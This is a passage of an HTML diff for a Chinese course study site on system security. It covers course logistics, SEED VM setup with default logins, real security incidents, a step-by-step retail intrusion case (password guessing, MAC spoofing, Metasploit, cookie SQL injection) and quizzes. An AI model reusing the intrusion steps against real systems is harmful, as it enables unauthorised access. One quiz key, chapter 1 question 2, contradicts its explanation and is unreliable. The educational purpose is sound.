@@ -1,0 +1,3109 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="light">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>系统安全 · 课程学习站</title>
+<meta name="description" content="基于《系统安全》课程课件与课堂代码整理的中文学习站点，覆盖信息安全概论、程序执行模型、缓冲区溢出、格式化字符串、防御机制、ret2libc、ROP、竞态条件与侧信道。">
+<link rel="icon" href="data:,">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+
+<header class="topbar">
+  <button class="btn ghost nav-toggle" id="nav-toggle" aria-label="打开目录">目录</button>
+  <div class="brand">系统安全<small>课程学习站</small></div>
+  <div class="search-wrap">
+    <input id="search-input" type="search" placeholder="搜索标题与正文，例如 栈帧、%n、ASLR…（按 / 聚焦）" autocomplete="off">
+    <div class="search-results" id="search-results"></div>
+  </div>
+  <button class="btn" id="theme-toggle">深色</button>
+</header>
+
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <h2>章节目录</h2>
+    <ul class="nav-list">
+      <li><a href="#home"><span class="nav-num">00</span>开始阅读</a></li>
+      <li><a href="#ch1"><span class="nav-num">01</span>课程与考核概览</a></li>
+      <li><a href="#ch2"><span class="nav-num">02</span>信息系统安全概论</a></li>
+      <li><a href="#ch3"><span class="nav-num">03</span>系统模型：从源码到执行</a></li>
+      <li><a href="#ch4"><span class="nav-num">04</span>缓冲区溢出</a></li>
+      <li><a href="#ch5"><span class="nav-num">05</span>整数溢出</a></li>
+      <li><a href="#ch6"><span class="nav-num">06</span>格式化字符串漏洞</a></li>
+      <li><a href="#ch7"><span class="nav-num">07</span>防御机制与绕过</a></li>
+      <li><a href="#ch8"><span class="nav-num">08</span>Return-to-libc</a></li>
+      <li><a href="#ch9"><span class="nav-num">09</span>ROP 返回导向编程</a></li>
+      <li><a href="#ch10"><span class="nav-num">10</span>竞态条件与 Dirty COW</a></li>
+      <li><a href="#ch11"><span class="nav-num">11</span>Meltdown 与 Spectre</a></li>
+      <li><a href="#appendix"><span class="nav-num">附</span>素材清单与章节映射</a></li>
+    </ul>
+    <div class="progress-box">
+      <div class="progress-label"><span>学习进度</span><span id="progress-text">0 / 12</span></div>
+      <div class="progress-track"><div class="progress-fill" id="progress-fill"></div></div>
+      <button class="progress-reset" id="progress-reset">清除进度</button>
+    </div>
+  </aside>
+
+  <main>
+  <div class="content">
+
+  <!-- ================= 首页 ================= -->
+  <section class="chapter" id="home">
+    <div class="ch-kicker">System Security · 学习站</div>
+    <h1>把课件读成一条能走通的技术线</h1>
+    <p class="lead">本站只使用 <code>D:\gpt\系统安全</code> 目录中的 7 份课件 PDF 与课堂共享代码整理而成。目标不是把 PPT 搬上网页，而是把“程序怎么被编译、被装载、被调用”“溢出为什么能改控制流”“防御为什么挡不住 ret2libc”讲成一条因果链。</p>
+
+    <div class="callout">
+      <b>先读这一条</b>
+      本课程的主线是<em>控制流劫持</em>：源代码的缺陷 → 编译后的内存布局 → 栈上的返回地址 → 攻击者改写返回地址 → 防御机制（NX / Canary / ASLR）→ 绕过（ret2libc / ROP）。第 4–9 章是这条主线的连续四步，建议按顺序阅读。
+    </div>
+
+    <h2>怎么用这个站点</h2>
+    <ul>
+      <li><strong>侧边目录</strong>按课程真实讲授顺序排列，共 11 章 + 1 个素材附录；滚动时高亮当前章。</li>
+      <li><strong>进度</strong>：每章末尾有“标记本章已读”，状态存在浏览器 localStorage 中，关闭页面后再打开仍然保留。</li>
+      <li><strong>搜索</strong>：对全部标题与正文做前端检索，结果显示所属章节与上下文片段，点击直接跳转。</li>
+      <li><strong>自测</strong>：每章 3–5 题，选完点“检查答案”即时判分并给出解析；判断题把“正确/错误”当作 A/B 选项。</li>
+      <li><strong>深色模式</strong>：右上角切换，选择也会被记住；移动端侧栏收进“目录”抽屉。</li>
+    </ul>
+
+    <h2>内容边界（重要）</h2>
+    <p>课程 PDF 只覆盖到第 0、1 讲与第 2 讲（软件安全 1、2-1、2-2、2-3）。<strong>Return-to-libc、ROP、竞态条件、Meltdown/Spectre 在第 2 讲 2-3 的大纲中列出，但本批 PDF 没有展开讲解</strong>；这四章以课堂共享代码为主进行说明，凡属代码可读出的事实照实写，凡属课件未讲的背景一律标注“课件未展开”，不补成定论。第 2 讲 2-3 的正文实际讲的是防御机制、ASLR/PIE、GOT/PLT 与 CFI。</p>
+
+    <div class="intro-grid">
+      <div class="intro-card"><h4>第 0 讲</h4><p>考核方式、48 课时内容地图、SEED 虚拟机环境。给全课程定坐标。</p></div>
+      <div class="intro-card"><h4>第 1 讲</h4><p>安全形势与真实案例、攻击五环节、信息系统的定义体系、CIA、安全策略/模型/机制、八大设计原则。</p></div>
+      <div class="intro-card"><h4>第 2 讲（1）</h4><p>gcc 四阶段、ELF 段、进程内存布局、x86 寄存器与 EFLAGS、cdecl 调用约定、栈帧与序言/结语。</p></div>
+      <div class="intro-card"><h4>第 2 讲（2-1～2-3）</h4><p>缓冲区溢出与整数溢出、格式化字符串任意读写、NX/Canary/ASLR/PIE/GOT/CFI。</p></div>
+      <div class="intro-card"><h4>课堂代码</h4><p>8 个代码目录、40 个 .c、9 个 .s、4 个 Python 脚本，另含预编译 ELF 与 badfile 样本。</p></div>
+      <div class="intro-card"><h4>延伸材料</h4><p>目录中已有前次整理的《格式化字符串漏洞-图解讲解》，可作第 6 章的补充图解。</p></div>
+    </div>
+
+    <h2>阅读顺序建议</h2>
+    <div class="table-wrap">
+      <table>
+        <tr><th>目标</th><th>建议路径</th></tr>
+        <tr><td>应付开卷考试</td><td>第 1 章 → 第 2 章 → 第 7 章（概念与原则题多）</td></tr>
+        <tr><td>看懂溢出实验</td><td>第 3 章 → 第 4 章 → 第 7 章 → 第 8 章</td></tr>
+        <tr><td>理解格式化字符串</td><td>第 3 章（栈与参数）→ 第 6 章 → 第 7 章</td></tr>
+        <tr><td>做完 SEED 风格实验</td><td>第 1 章环境 → 第 4 章 → 第 8/9 章</td></tr>
+      </table>
+    </div>
+
+    <p style="color:var(--muted);font-size:14px">本站内容为学习整理，不构成对任何真实系统的攻击指导；所有实验均应在课件提供的隔离虚拟机中进行。</p>
+  </section>
+
+  <!-- ================= 第 1 章 ================= -->
+  <section class="chapter" id="ch1">
+    <div class="ch-kicker">第 1 章 · 对应《第0讲 系统安全课程安排》</div>
+    <h1>课程与考核概览</h1>
+    <p class="lead">先弄清“考什么、讲什么、在哪做实验”。这一章信息全部来自第 0 讲课件与《虚拟机镜像》说明。</p>
+
+    <h2>1.1 授课与考核</h2>
+    <p>授课对象为网安 2401–2404 班，课程分两段：<strong>袁斌</strong>负责第 7–12 周，<strong>羌卫中</strong>负责第 13–18 周。综合评分构成为：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>项目</th><th>比例</th><th>形式</th></tr>
+        <tr><td>期末考试</td><td>80%</td><td>开卷</td></tr>
+        <tr><td>平时成绩</td><td>20%</td><td>课堂作业</td></tr>
+      </table>
+    </div>
+    <p>“开卷”意味着考点更偏向<strong>概念辨析与原理判断</strong>：定义能否复述、原则能否对号入座、某防御能否挡住某攻击。本站每章的“易错点 / 考点”小段就是按这个风格写的。</p>
+
+    <h2>1.2 48 课时的内容地图</h2>
+    <p>课件把课程内容分成两大块。第一块是原理与机制：</p>
+    <ul>
+      <li>信息系统安全概述</li>
+      <li>软件安全（本站第 3–9 章的主体）</li>
+      <li>系统模型</li>
+      <li>控制流劫持</li>
+      <li>控制流完整性</li>
+      <li>竞态条件</li>
+    </ul>
+    <p>第二块是安全模型与机制：</p>
+    <ul>
+      <li>信息系统安全模型与机制：信息安全模型、访问控制机制、安全体系结构、身份认证</li>
+      <li>典型信息系统安全：操作系统安全、虚拟化安全、云计算系统安全、IoT 系统安全</li>
+      <li>协议安全与形式化分析等</li>
+    </ul>
+    <p style="color:var(--muted);font-size:14px">注：本批 PDF 只到第 2 讲，后面这些主题没有对应课件，本站不展开。</p>
+
+    <h2>1.3 参考资料</h2>
+    <ul>
+      <li>石文昌《信息系统安全概论》（第 2 版），电子工业出版社——课程主教材。</li>
+      <li>Stanford CS155（Computer Security）、CMU 18-732（Secure Software System）、Cornell CS6431（Security and Privacy Technologies）。</li>
+      <li>SEED Labs（Wenliang Du），<code>handsonsecurity.net</code>；课程实验代码的组织方式与 SEED 实验高度一致。</li>
+      <li>刘建伟等《信息系统安全实验教程》，清华大学出版社。</li>
+      <li>课程课件发布在 <code>smartcourse.hust.edu.cn</code>。</li>
+    </ul>
+
+    <h2>1.4 实验环境：SEED Ubuntu 虚拟机</h2>
+    <p>《___虚拟机镜像.pdf》是 SEED 官方 VirtualBox 使用手册。要点：</p>
+    <ul>
+      <li>默认账号 <code>seed / dees</code>；root 账号 <code>root / seedubuntu</code>（平时不需要登录 root）。</li>
+      <li>虚拟机是 <strong>32 位 Ubuntu</strong>，新建虚拟机时不要选 64 位 Ubuntu。</li>
+      <li>推荐 VirtualBox 6.0.4；内存 1024 MB 可用，建议 2 GB；显卡选 VBoxVGA。</li>
+      <li>多机实验要克隆虚拟机，克隆时<strong>必须重新初始化 MAC 地址</strong>，否则两台机器 IP 相同。</li>
+      <li>需要虚拟机互通且能上网，网卡用 <strong>NAT Network</strong>（不是默认 NAT，也不是 Host-only）。</li>
+      <li>做危险操作前先打快照；恢复快照需先关机。</li>
+      <li>共享文件夹：宿主机建目录 → VirtualBox 设置里添加 → 虚拟机内 <code>sudo mount -t vboxsf -o rw,uid=1000,gid=1000 share /home/seed/host</code>。</li>
+    </ul>
+
+    <div class="callout warn">
+      <b>为什么实验都在 32 位系统上做</b>
+      本课程的溢出实验使用固定栈地址（如 <code>0xbfff…</code>）、4 字节返回地址、<code>unsigned short</code> 回绕等 32 位特征；64 位地址空间下偏移、地址宽度与 ASLR 熵都不同，课件中的具体数值不能直接照搬。
+    </div>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 第 1 章<span>3 题</span></div>
+
+      <div class="q" data-answer="B" data-explain="课件第 2 页写明：考试 80%（开卷），平时 20%（课堂作业）。">
+        <div class="q-stem"><span class="qno">1.</span>本课程的综合评分构成是？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q1-1" value="A"><span>A. 考试 60% + 实验 40%</span></label>
+          <label class="opt"><input type="radio" name="q1-1" value="B"><span>B. 考试 80%（开卷）+ 平时 20%（课堂作业）</span></label>
+          <label class="opt"><input type="radio" name="q1-1" value="C"><span>C. 考试 70% + 考勤 30%</span></label>
+          <label class="opt"><input type="radio" name="q1-1" value="D"><span>D. 全开卷论文考核</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="B" data-multi="true" data-explain="SEED 手册强调：新建虚拟机要选 32 位 Ubuntu；克隆时必须重新初始化 MAC 地址。推荐 VirtualBox 6.0.4。手册并未要求必须用 Host-only，多机互通+上网要用 NAT Network。">
+        <div class="q-stem"><span class="qno">2.</span>关于 SEED 虚拟机环境，下列哪些说法与手册一致？<span class="q-tag">多选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="checkbox" name="q1-2" value="A"><span>A. 预置镜像是 32 位 Ubuntu，新建虚拟机时应选 32 位而非 64 位</span></label>
+          <label class="opt"><input type="checkbox" name="q1-2" value="B"><span>B. 克隆虚拟机必须重新初始化 MAC 地址，否则两台机 IP 会冲突</span></label>
+          <label class="opt"><input type="checkbox" name="q1-2" value="C"><span>C. 要让多台虚拟机互通并访问外网，应使用 Host-only 网卡</span></label>
+          <label class="opt"><input type="checkbox" name="q1-2" value="D"><span>D. 恢复快照前必须先关闭虚拟机</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="A" data-explain="课件把课程内容分为“信息系统安全概述、软件安全、系统模型、控制流劫持、控制流完整性、竞态条件”与“安全模型与机制、典型信息系统安全、协议安全与形式化分析”等。访问控制、身份认证属于后一块，并非软件安全章节的核心。">
+        <div class="q-stem"><span class="qno">3.</span>下列哪一项<strong>不属于</strong>课件列出的“软件安全 / 控制流”部分？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q1-3" value="A"><span>A. 身份认证</span></label>
+          <label class="opt"><input type="radio" name="q1-3" value="B"><span>B. 控制流劫持</span></label>
+          <label class="opt"><input type="radio" name="q1-3" value="C"><span>C. 竞态条件</span></label>
+          <label class="opt"><input type="radio" name="q1-3" value="D"><span>D. 控制流完整性</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+
+    <div class="callout ok">
+      <b>考点提示</b>
+      第 0 讲最容易出的题就是“考核比例 + 课程内容归类”，属于送分题，别丢。
+    </div>
+    <button class="btn primary" data-mark-read>标记本章已读</button>
+  </section>
+
+  <!-- ================= 第 2 章 ================= -->
+  <section class="chapter" id="ch2">
+    <div class="ch-kicker">第 2 章 · 对应《第1讲 信息系统安全概论》</div>
+    <h1>信息系统安全概论</h1>
+    <p class="lead">第 1 讲做了三件事：用真实事件说明“为什么必须学”；用一次完整的入侵说明“攻击是怎么串起来的”；用一组定义把“安全”变成可讨论、可设计的东西。</p>
+
+    <h2>2.1 安全形势：课件用的真实事件</h2>
+    <p>课件以战争与关键基础设施事件开篇，强调信息系统已成为攻防主战场：</p>
+    <ul>
+      <li><strong>海湾战争（1990–1991）</strong>：课件称其为“世界上首次全面信息战”；美军向装有病毒（AFgl）的打印机设备发送指令，使伊拉克防空指挥系统瘫痪。</li>
+      <li><strong>科索沃战争（1999）</strong>：电子专家侵入南联盟防空体系计算机系统，使其雷达屏幕上出现并不存在的目标；“梅利莎”“疯牛”病毒一度使北约计算机通信网瘫痪。</li>
+      <li><strong>震网 Stuxnet（2010）</strong>：美以研发，伊朗约 60% 电脑感染，目标为核电站离心机；主要攻击 SIMATIC WinCC，利用 MS08-067、MS10-046、MS10-061、MS10-073、MS10-092 等多个漏洞。</li>
+      <li><strong>顿巴斯战争（2014）</strong>：火炮定位 App“定位-D30”被“梦幻熊”组织篡改植入后门，把火炮位置发给监听者。</li>
+      <li><strong>乌克兰西部电网（2015）</strong>：从邮件系统渗透内网，操纵断路器使电网解体，140 万居民断电。</li>
+      <li><strong>委内瑞拉电网（2020）</strong>：765 kV 干线遭攻击，缺少风险阻断机制，停电蔓延 11 个州。</li>
+      <li><strong>伊朗纳坦兹（2021）</strong>：断电事故，课件注明“攻击路径尚无定论”。</li>
+      <li><strong>黎巴嫩通信设备爆炸（2024）</strong>：BP 机、对讲机爆炸，分析称炸药伪装成电池绕过安全检查——课件把它归为<strong>供应链安全</strong>问题。</li>
+    </ul>
+    <p>课件还给出漏洞数量的量级：2019 年上半年国家信息安全漏洞共享平台收录通用型漏洞 5859 个（高危 2055）；2021 年工信部平台累计收集漏洞 143319 个（高危 40498、中危 86217）。这些数字用来说明“漏洞无处不在”，不需要精确记忆到个位，记住<strong>量级与高危占比</strong>即可。</p>
+
+    <div class="callout warn">
+      <b>表述边界</b>
+      “每千行代码存在 2–3 个 BUG”是课件引用的经验说法，不是定理；课件用它支撑“信息系统脆弱性”这一论点。
+    </div>
+
+    <h2>2.2 一个完整攻击案例：从公开信息到 100 万条信用卡</h2>
+    <p>课件用一个连锁零售企业被入侵的案例，把攻击拆成可复用的步骤。这条线索非常适合作为全课程的“目录”：</p>
+    <ol>
+      <li><strong>动机与情报</strong>：媒体报道公司网点遍布全国 → 攻击者想盗信用卡数据 → 查 InterNIC 公开注册信息，得到公司 IP 段 <code>a.b.c.0~255</code>。</li>
+      <li><strong>准备与反检测</strong>：找替罪机器装 FragRouter，重新分片以规避不具备重组能力的 IDS。</li>
+      <li><strong>扫描</strong>：Cheops-ng 发现三台主机；Nmap SYN 扫描发现 TCP 80（Web）；Nmap UDP 扫描发现 UDP 53（DNS）；Firewalk 探明包过滤防火墙只放行 80/53 进入 DMZ；Nessus 漏洞扫描显示 DMZ 无可利用漏洞。</li>
+      <li><strong>换入口：无线</strong>：Wellenreiter 探到 SSID <code>golucorp041</code>；用该 SSID 直接连无响应，<code>ifconfig</code> 伪造 MAC 后成功接入并拿到 DHCP 地址。</li>
+      <li><strong>进入销售点 A</strong>：Nmap ping 扫描找到 POS 与服务器 IP；<code>dig</code> 反查得域名 <code>store041.internal_goodluck.com</code>；SYN 扫描发现 TCP 5900（VNC）；THC Hydra 猜出账号 <code>operator</code>、口令 <code>rotarepo</code>；登录后在某文件里发现 10 万张信用卡记录。</li>
+      <li><strong>横向到销售点 B</strong>：上一台 VNC 服务器 IP 为 w.x.y.z，试 w.x.y.z+1 成功，账号口令相同。</li>
+      <li><strong>换更强的手段</strong>：A 点的端口扫描显示运行常见备份程序且存在缓冲区溢出漏洞 → 用 Metasploit 打 B 点，拿到 shell → 在 B 上装嗅探程序，发现 B 向 C 发交易授权请求。</li>
+      <li><strong>打进总部</strong>：C 服务器 TCP 443 开放；原 VNC 口令与 Hydra 均失败；Paros Proxy 扫 Web 应用，在 <strong>cookie</strong> 中发现 SQL 注入 → 注入成功，后端数据库拿到 100 万张信用卡资料。</li>
+    </ol>
+    <p>课件在最后标注了两条技术归属：<strong>缓冲区溢出 → 软件安全</strong>；<strong>SQL 注入 → Web 安全</strong>。这正是本站第 4 章之后的内容位置。</p>
+
+    <h3>西工大事件：国家级攻击的组织化样本</h3>
+    <p>课件用 10 页篇幅复盘 2022 年西北工业大学遭 NSA“特定入侵行动办公室”（TAO）攻击的调查报告，关键事实：</p>
+    <ul>
+      <li>TAO 隶属 NSA 信息情报部数据侦察局，2000 多名军人及文职人员，下设 10 个单位。</li>
+      <li>使用 41 种专用网络攻击武器装备，通过 17 个国家的 49 台跳板机与 5 台代理服务器发起上千次攻击；跳板机 IP 均不属于“五眼联盟”国家，约 70% 位于中国周边（日、韩等）。</li>
+      <li>六个阶段：身份隐藏（匿名注册、掩护公司买 IP）→ 隐蔽通道（控制通道与攻击通道分离，部署“酸狐狸”FOXACID）→ 网络突破（0day/nday，武器“剃须刀”“孤岛”“酸狐狸”）→ 网络拓展（“二次约会”中间人、“饮茶”嗅探口令）→ 网络控守（“NOPEN”“怒火喷射”等木马）→ 隐蔽消痕（“吐司面包”清 utmp/wtmp/lastlog）。</li>
+    </ul>
+
+    <h2>2.3 攻击的五个环节</h2>
+    <p>课件把安全攻击概括为五个阶段，这是本章最该背下来的框架：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>环节</th><th>课件给出的典型手段</th></tr>
+        <tr><td>侦察 Reconnaissance</td><td>社会工程学、翻垃圾、受害者网站、Whois/InterNIC/Uwhois、DNS 服务器、Sam Spade 等工具</td></tr>
+        <tr><td>扫描 Scanning</td><td>网段/设备扫描 Cheops-ng、端口扫描 Nmap、防火墙扫描 Firewalk、无线扫描 Wellenreiter、拨号扫描 THC-Scan、漏洞扫描 Nessus</td></tr>
+        <tr><td>获取访问 Gaining Access</td><td>攻击操作系统（缓冲区溢出、口令攻击）；攻击 Web 应用（账户捕获、会话捕获、SQL 注入、浏览器漏洞）；攻击网络（嗅探、IP 欺骗、会话劫持）；拒绝服务</td></tr>
+        <tr><td>维持访问 Maintaining Access</td><td>木马、后门；应用层木马后门包括远程控制程序、僵尸程序（Bot）、间谍软件</td></tr>
+        <tr><td>掩盖踪迹 Covering Tracks</td><td>修改日志中反映攻击行为的信息：失败登录尝试、特殊账户使用、安全敏感命令运行</td></tr>
+      </table>
+    </div>
+
+    <h2>2.4 定义体系：主机系统、信息系统与安全性</h2>
+    <p>课件用编号定义的方式建立讨论基础，复习时按“定义 1.x”顺序记：</p>
+    <ul>
+      <li><strong>定义 1.1</strong> 一台计算机的所有硬件和软件构成的整体，称为一个<em>主机系统</em>。</li>
+      <li><strong>定义 1.2</strong> 一套应用软件及支撑其运行的所有硬件和软件构成的整体，称为一个<em>信息系统</em>。</li>
+      <li><strong>定义 1.3</strong> 若信息系统 A 的某些功能需由主机系统 H 实施，称 A 依赖 H，或 H <em>承载</em> A。</li>
+      <li><strong>引理 1.1</strong> 承载任何一个信息系统所需的主机系统数量是有限的。</li>
+      <li><strong>定义 1.4</strong> 网络设施对信息系统的承载（同构定义）。</li>
+      <li><strong>定理 1.1</strong> 任何信息系统都只需由有限数量的主机系统和有限数量的网络设施承载。</li>
+      <li><strong>定义 1.5</strong> 信息系统的<em>安全性</em>指信息系统具有的降低安全攻击风险的特性，作用体现在两点：降低攻击成功的可能性；降低成功攻击造成的损害。</li>
+      <li><strong>定理 1.2</strong> 主机系统安全与网络安全相结合，是信息系统安全的有效方法。</li>
+      <li><strong>推论 1.1</strong> 信息系统安全问题：涉及硬件安全和软件安全；<strong>以主机系统安全为核心</strong>；需要兼顾网络安全。</li>
+    </ul>
+
+    <h2>2.5 经典三要素：CIA</h2>
+    <div class="table-wrap">
+      <table>
+        <tr><th>要素</th><th>课件定义</th><th>被破坏的例子</th></tr>
+        <tr><td>机密性 Confidentiality（定义 1.6）</td><td>防止私密的或机密的信息泄露给非授权实体的属性</td><td>信用卡资料被读出、/%s 泄栈</td></tr>
+        <tr><td>完整性 Integrity（定义 1.7）</td><td>分<em>数据完整性</em>（数据含软件代码只能按授权方式修改）与<em>系统完整性</em>（系统未受未授权操控、完好执行预定功能）</td><td>用 %n 改 secret；用溢出改返回地址</td></tr>
+        <tr><td>可用性 Availability（定义 1.8）</td><td>确保系统及时工作并向授权用户提供所需服务的属性</td><td>%s%s%s 造成崩溃；DoS</td></tr>
+      </table>
+    </div>
+
+    <h2>2.6 安全策略、安全模型、安全机制</h2>
+    <p>三个概念层层落地，课件各给了三种表述，理解“策略是规定、模型是形式化、机制是实现”即可：</p>
+    <ul>
+      <li><strong>安全策略</strong>（定义 1.9–1.11）：组织为达到安全目标，如何管理、保护和发布信息资源的法律、规章和条例的集合；为达到一组安全目标而设计的规则集合；关于允许什么和禁止什么的规定。</li>
+      <li><strong>安全模型</strong>（定义 1.12–1.13）：拟由系统实施的安全策略的<em>形式化表示</em>；用更形式化或数学化的术语对安全策略的重新表述。<strong>定义 1.14</strong> 主动发起访问的实体为主体，被动接受的为客体。</li>
+      <li><strong>安全机制</strong>（定义 1.15–1.17）：实现安全功能的逻辑或算法；在硬件和软件中实现特定安全功能的逻辑或算法；实施安全策略的方法、工具或规程。</li>
+    </ul>
+    <p>课件用<strong>访问控制矩阵模型</strong>作为“安全模型”的示例（行是主体、列是客体、格中是权限），并提到路由器配置“只对特定机器开放访问”即白名单 <code>allow IP/MAC</code>，是从策略到机制的具体化。</p>
+
+    <h2>2.7 安全机制设计八大原则</h2>
+    <p>这是开卷考试的高频考点，必须能把“原则名—含义—典型例子”对上号：</p>
+    <div class="table-wrap">
+      <table>
+        <tr><th>原则</th><th>课件含义</th><th>记忆抓手</th></tr>
+        <tr><td>① 经济性 Economy of Mechanism</td><td>机制尽可能简单短小，便于代码审查排查缺陷</td><td>越简单越好审</td></tr>
+        <tr><td>② 默认拒绝 Fail-Safe Defaults</td><td>没有授权信息就不允许访问</td><td>默认关门</td></tr>
+        <tr><td>③ 完全仲裁 Complete Mediation</td><td>授权检查覆盖任何一个访问操作；机制要能标识访问请求的所有源头</td><td>每次都查，不漏一次</td></tr>
+        <tr><td>④ 开放设计 Open Design</td><td>不把机制设计当秘密；安全性应依赖密钥、口令等易保护元素，而非设计保密</td><td>算法公开、密钥保密</td></tr>
+        <tr><td>⑤ 特权分离 Separation of Privilege</td><td>细分特权分配给多个主体，减少每个特权拥有者的权力</td><td>一把钥匙开不了门</td></tr>
+        <tr><td>⑥ 最小特权 Least Privilege</td><td>每个程序和用户只拥有完成工作所需的最小特权集合</td><td>够用就行</td></tr>
+        <tr><td>⑦ 最少公共机制 Least Common Mechanism</td><td>减少多个用户共用、被全体依赖的机制数量</td><td>少共用，少连坐</td></tr>
+        <tr><td>⑧ 心理可接受 Psychological Acceptability</td><td>机制交互良好、安全目标与机制吻合；例：口令系统</td><td>别难用到用户绕过</td></tr>
+      </table>
+    </div>
+
+    <h3>易错点</h3>
+    <p>课件第 103 页留了一道判断题：“某项系统功能以共享库形式提供、由用户按需调用，而不是以系统服务形式提供给全体用户，这种做法主要是考虑最小特权原则。”——这句话的落点是<strong>减少公共机制</strong>（最少公共机制原则），不是最小特权。两者容易混：最小特权讲“单个主体权限最小”，最少公共机制讲“共用机制最少”。</p>
+
+    <h2>2.8 防护基本原则与几个清醒的结论</h2>
+    <ul>
+      <li><strong>整体性原则</strong>：从整体上构思安全框架，合理选择与布局技术组件，使其相互关联、补充。</li>
+      <li><strong>木桶原理</strong>：容量取决于最短的木板；信息安全是系统工程，每个环节都安全才安全。</li>
+      <li><strong>分层性原则</strong>：不能依赖单一机制；主机身份认证、访问控制、审计、防病毒 → 基于主机的 IDS → 网络访问控制（内部防火墙）→ 网络 IDS → 网络防火墙。</li>
+      <li><strong>最小特权原则</strong>：管理员权限划分为系统管理员、系统审计员、系统安全员。</li>
+    </ul>
+    <p>课件的“几点认识”值得原样记住：<strong>没有绝对的安全；安全是一个动态的过程；人往往是安全机制中最薄弱的环节；系统越安全，给用户带来的不便就越多。</strong>课件还引用 Gollmann 的“安全的根本困境”（用户有具体安全需求却没有安全专业知识），以及 Hellman 的权衡观、Sandhu 的“Good Enough Security”（“尽可能安全到必要程度，但不要更安全”）。“安全通常是设计完成后的事后考虑，而不是设计过程的一部分”是课件明确批评的现象。</p>
+
+    <div class="quiz">
+      <div class="quiz-title">自测 · 第 2 章<span>4 题</span></div>
+
+      <div class="q" data-answer="C" data-explain="定义 1.5 明确列出两点：降低攻击成功的可能性；降低成功攻击造成的损害。C 项“消除”与课件“没有绝对的安全”相冲突。">
+        <div class="q-stem"><span class="qno">1.</span>按定义 1.5，信息系统安全性作用体现在？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q2-1" value="A"><span>A. 提高系统性能与可用性</span></label>
+          <label class="opt"><input type="radio" name="q2-1" value="B"><span>B. 保证系统绝对不被攻破</span></label>
+          <label class="opt"><input type="radio" name="q2-1" value="C"><span>C. 降低攻击成功的可能性，降低成功攻击造成的损害</span></label>
+          <label class="opt"><input type="radio" name="q2-1" value="D"><span>D. 满足法律法规的合规要求</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="ACD" data-multi="true" data-explain="课件概括的五个环节为：侦察、扫描、获取访问、维持访问、掩盖踪迹。“提权”在本讲的五环节框架中没有单列（TAO 案例里木马具备提权能力，但那是能力描述，不是环节名）。">
+        <div class="q-stem"><span class="qno">2.</span>下列哪些属于课件概括的攻击环节？<span class="q-tag">多选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="checkbox" name="q2-2" value="A"><span>A. 侦察</span></label>
+          <label class="opt"><input type="checkbox" name="q2-2" value="B"><span>B. 提权</span></label>
+          <label class="opt"><input type="checkbox" name="q2-2" value="C"><span>C. 维持访问</span></label>
+          <label class="opt"><input type="checkbox" name="q2-2" value="D"><span>D. 掩盖踪迹</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="B" data-explain="共享库按需调用、不向全体用户提供系统服务，减少的是“多用户共用、被全体依赖的机制”，对应最少公共机制原则（Least Common Mechanism），而非最小特权。">
+        <div class="q-stem"><span class="qno">3.</span>“某项功能以共享库形式由用户按需调用，而不是以系统服务形式提供给全体用户”，主要体现哪条原则？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q2-3" value="A"><span>A. 最小特权原则</span></label>
+          <label class="opt"><input type="radio" name="q2-3" value="B"><span>B. 最少公共机制原则</span></label>
+          <label class="opt"><input type="radio" name="q2-3" value="C"><span>C. 完全仲裁原则</span></label>
+          <label class="opt"><input type="radio" name="q2-3" value="D"><span>D. 开放设计原则</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+
+      <div class="q" data-answer="A" data-explain="课件原话：“没有绝对的安全”“安全是一个动态过程”“人往往是安全机制中最薄弱的环节”。B 与“安全与便利的权衡”相反；C 不是课件观点（开放设计强调机制公开、密钥保密）；D 与木桶原理和分层原则相反。">
+        <div class="q-stem"><span class="qno">4.</span>下列哪一项是课件的观点？<span class="q-tag">单选</span></div>
+        <div class="opts">
+          <label class="opt"><input type="radio" name="q2-4" value="A"><span>A. 安全是动态过程，没有绝对的安全</span></label>
+          <label class="opt"><input type="radio" name="q2-4" value="B"><span>B. 系统越安全，用户体验一定越好</span></label>
+          <label class="opt"><input type="radio" name="q2-4" value="C"><span>C. 安全机制的设计细节必须保密才安全</span></label>
+          <label class="opt"><input type="radio" name="q2-4" value="D"><span>D. 只要网络防火墙足够强，主机安全可以不考虑</span></label>
+        </div>
+        <div class="q-actions"><button class="btn" data-check>检查答案</button><button class="btn ghost" data-reset>重做</button></div>
+        <div class="q-explain"></div>
+      </div>
+    </div>
+    <button class="btn primary" data-mark-read>标记本章已读</button>
+  </section>
+
+  <!-- ================= 第 3 章 ================= -->
+  <section class="chapter" id="ch3">
+    <div class="ch-kicker">第 3 章 · 对应《第2讲 软件安全1》</div>
+    <h1>系统模型：从源代码到执行</h1>
